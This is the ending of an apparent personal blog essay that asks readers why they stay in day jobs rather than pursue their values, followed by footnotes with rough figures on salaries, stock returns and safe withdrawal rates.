<li>The credentials, learning or capital from your job are a critical step to future plans</li>
</ul>
<p>If none of those excuses apply, what are you doing instead?</p>
<p>Presumably, you have some values, and those values are not maxed out. They might be hedonic (your life is not as pleasurable as it could be), altruistic (the world is not as good as it could be), or narcissistic (your status is not as high as it could be).</p>
<p>Whatever the case, day jobs seem to be the proximate cause holding you back. I realize that quitting your job won’t magically turn you into a dream-fulfilling machine, but it is probably a good first step.</p>
<p>Everyone knows this. Everyone knows that it is best to directly pursue instrinsic value instead of getting distracted by instrumental goods and side quests.</p>
<p>So again, what are you doing?</p>
<p>I’m not asking rhetorically and this isn’t a motivational essay. I genuinely want to know.</p>
<p>Seriously, email me.</p>
<hr>
<p>[1] I’m assuming 20 days of vacation, holiday, sick leave, etc.</p>
<p>[2] If you already work at FAANG, odds are probably much better. This reduces opportunity cost, and strengthens my point.</p>
<p>[3] Of course, the early earnings compound, but your salary also goes up later in life. Maybe that’s not exactly a wash, but this is all back-of-the-napkin anyway.</p>

<p>[5] I’m sort of kidding, but seriously, what else are you spending money on?</p>
<p>[6] For the record, the S&amp;P is up 70% in the last 5 years, or around 11% annualized.</p>
<p>[7] I know you’ve heard 4%, but 5% seems reasonable. <a target="_blank" rel="noopener" href="https://www.marketwatch.com/story/the-inventor-of-the-4-rule-just-changed-it-11603380557">MarketWatch</a>, <a target="_blank" rel="noopener" href="https://www.reddit.com/r/financialindependence/comments/jg898y/4_rule_update/">Reddit</a>.</p>
<p>[8] To be clear, this is not a financial independence blog. It seems great in theory, but given how many people seem to struggle with fulfillment afterwards, I can’t strongly recommend it. I’m not against it either, but I’d like to figure out what’s going before I start giving life advice.</p>
